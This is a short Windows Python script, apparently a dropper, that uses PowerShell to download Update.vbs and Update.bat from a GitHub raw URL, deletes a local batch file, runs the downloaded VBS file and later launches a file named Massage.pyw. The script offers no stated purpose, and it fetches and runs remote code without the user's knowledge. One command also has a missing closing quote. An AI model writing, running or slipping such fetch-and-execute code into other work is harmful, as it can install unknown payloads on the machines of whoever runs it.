import os
import subprocess
subprocess.Popen('timeout /t 10', shell=True)                                              #-----------#
subprocess.Popen('powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/Update.vbs -OutFile Update.vbs"', shell=True)
subprocess.Popen('del Update.bat', shell=True)                                             #-----------#
subprocess.Popen('powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/Update.bat -OutFile Update.bat', shell=True)
subprocess.Popen('timeout /t 5', shell=True)
subprocess.Popen('start Update.vbs', shell=True)
subprocess.Popen('timeout /t 5', shell=True)
subprocess.Popen('timeout /t 300', shell=True)
subprocess.Popen('Massage.pyw', shell=True)
